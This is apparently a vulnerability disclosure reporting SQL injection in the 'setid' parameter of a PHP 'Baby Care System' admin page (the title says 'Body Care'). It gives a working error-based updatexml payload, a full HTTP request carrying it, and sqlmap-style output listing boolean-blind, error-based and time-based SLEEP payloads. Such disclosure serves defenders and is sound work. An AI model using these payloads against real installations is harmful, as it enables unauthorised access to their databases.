## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/theme.php

Vulnerability location: BabyCare/admin.php?id=theme&setid= //setid is Injection point

[+]Payload: setid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)--+ //setid is Injection point

```sql
GET /BabyCare/admin.php?id=theme&setid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)--+ HTTP/1.1
Host: 192.168.1.19
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=7r2orfo1e9b49mg28f5ke9bdjv
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/160946471-10840cdf-abfb-4742-9a0a-4a48600b1581.png)

![image](https://user-images.githubusercontent.com/54017627/160946678-99fdf520-87c2-4716-9371-e98e8e486bfe.png)


```sql
---
Parameter: setid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=theme&setid=1' AND 4666=4666 AND 'rScZ'='rScZ

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=theme&setid=1' AND (SELECT 1518 FROM(SELECT COUNT(*),CONCAT(0x7171707671,(SELECT (ELT(1518=1518,1))),0x7176717671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'KBjM'='KBjM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=theme&setid=1' AND (SELECT 8964 FROM (SELECT(SLEEP(5)))SZjt) AND 'pISR'='pISR
---
```

![image](https://user-images.githubusercontent.com/54017627/160946391-781b87fe-7b80-4b1f-b3ef-38753cf17906.png)
